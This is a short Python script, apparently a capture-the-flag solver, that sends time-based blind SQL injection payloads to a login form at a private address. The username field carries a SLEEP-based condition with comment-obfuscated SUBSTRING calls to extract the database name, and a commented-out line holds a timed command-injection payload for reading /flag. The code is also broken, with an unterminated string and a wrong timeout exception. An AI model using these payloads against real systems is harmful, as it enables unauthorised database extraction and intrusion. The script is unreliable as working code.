import requests
import time


def handle_exp(exp):
    return exp


url = "http://10.1.100.50:8081/login.php"

param = "a"

cmd = "cat /flag"

result = ""


for line in range(1, 10):
    for letter in range(1, 50):
        for acc in range(32, 126):
            # exp = f"if [ $({cmd} | awk NR=={line} | cut -c {letter}) == {chr(acc)} ];then sleep 3;fi"
            exp = f"ascii(subs/**/tring(database(),1,1))
            # print(exp)
            try:
                # res = requests.get(url + f"?{param}={handle_exp(exp)}", timeout=2)
                data = {
                    "login791": "Login",
                    "password": "123",
                    "username": f"admin' AND if( {exp} = 77,1,SLEEP (2))--+",
                }
                res = requests.post(url=url, data=data, timeout=2)
                print(res.text)

            except TimeoutError:
                result += chr(acc)
                print(chr(acc))

print(result)
